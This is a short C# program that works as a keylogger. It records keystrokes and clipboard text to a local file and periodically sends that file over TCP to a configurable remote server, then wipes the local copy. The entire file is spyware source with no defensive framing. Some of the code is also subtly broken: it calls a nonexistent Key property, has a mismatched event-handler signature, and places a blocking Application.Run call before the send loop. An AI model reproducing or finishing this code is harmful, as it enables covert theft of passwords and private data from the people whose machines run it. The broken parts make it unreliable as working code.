using System;
using System.IO;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;

class Program
{

    static string ipServer = "Ip server Aqui";
    static int port = 5000;
    static string fileSave = "save.txt";
    static int timeInterval = 30;
    static string dataCp = "";



    static void Capture(KeyPressEventArgs e) 
    {
        try
        {
            using (StreamWriter sw = new StreamWriter(fileSave, true))
            {
                sw.Write(e.KeyChar);
            }
        }
        catch (Exception)
        {
            if (e.Key == Keys.Space) 
            {
                using (StreamWriter sw = new StreamWriter(fileSave, true))
                {
                    sw.Write(' ');
                }
            }
            else if (e.Key == Keys.Tab) 
            {
                using (StreamWriter sw = new StreamWriter(fileSave, true))
                {
                    sw.Write('\t');
                }
            }
            else if (e.Key == Keys.Back) 
            {
                using (StreamWriter sw = new StreamWriter(fileSave, true))
                {
                    sw.Write(" <backspace> ");
                }
            }
            else if (e.Key == Keys.Enter)
            {
                using (StreamWriter sw = new StreamWriter(fileSave, true))
                {
                    sw.Write(Environment.NewLine);
                }
            }
        }
    }

    static void Send(TcpClient clientSocket) 
    {
        int compt = 0;
        try
        {
            string fileData = File.ReadAllText(fileSave);

            if (!string.IsNullOrEmpty(fileData))
            {
                NetworkStream networkStream = clientSocket.GetStream();
                byte[] data = System.Text.Encoding.UTF8.GetBytes(fileData);
                networkStream.Write(data, 0, data.Length);
                Console.WriteLine("--> sending <--");

                File.WriteAllText(fileSave, string.Empty); 
                Console.WriteLine("--> cleaning <--\n");
            }
            else
            {
                Console.WriteLine("--> empty file <--\n");
            }
        }
        catch (Exception)
        {
            Console.WriteLine("Error: cannot send file to the server...");
            compt++;
            if (compt > 4) 
            {
                Environment.Exit(1);
            }
            else
            {
                Thread.Sleep(120000); 
            }
        }
    }

    static TcpClient Connect() 
    {
        int compt = 0;
        TcpClient clientSocket = new TcpClient();
        while (true)
        {
            try
            {
                clientSocket.Connect(ipServer, port);
                Console.WriteLine("Client connecté au serveur.");
                return clientSocket;
            }
            catch (Exception)
            {
                Console.WriteLine("Error: cannot connect to the server...");
                compt++;
                if (compt > 4) 
                {
                    Environment.Exit(1);
                }
                else
                {
                    Thread.Sleep(120000); 
                }
            }
        }
    }



    static void ClipboardSave() 
    {
        string data = Clipboard.GetText();
        if (!string.IsNullOrEmpty(data) && data != dataCp)
        {
            using (StreamWriter sw = new StreamWriter(fileSave, true))
            {
                sw.WriteLine("\n---\nClipboard: " + data + " \n---\n");
            }
            dataCp = data;
        }
    }


    static void Main(string[] args)
    {
        while (true)
        {
            TcpClient clientSocket = Connect();
            HookKeyboard();
            while (true)
            {
                try
                {
                    Thread.Sleep(timeInterval * 1000);
                    ClipboardSave();
                    Send(clientSocket);
                }
                catch (ThreadInterruptedException)
                {
                    Console.WriteLine(">>> stop <<<");
                    break;
                }
                catch (Exception)
                {
                    Console.WriteLine("Error: the client can't send to the server");
                    clientSocket.Close();
                    break;
                }
            }
        }
    }


    private static void HookKeyboard()
    {
        KeyboardHook.Start();
        KeyboardHook.KeyPress += Capture;
    }
}

public static class KeyboardHook
{
    public static event KeyPressEventHandler KeyPress;

    public static void Start()
    {
        Application.EnableVisualStyles();
        Application.SetCompatibleTextRenderingDefault(false);
        Application.Run(new KeyListener());
    }

    private class KeyListener : Form
    {
        protected override void OnKeyPress(KeyPressEventArgs e)
        {
            KeyPress?.Invoke(this, e);
            base.OnKeyPress(e);
        }
    }
}
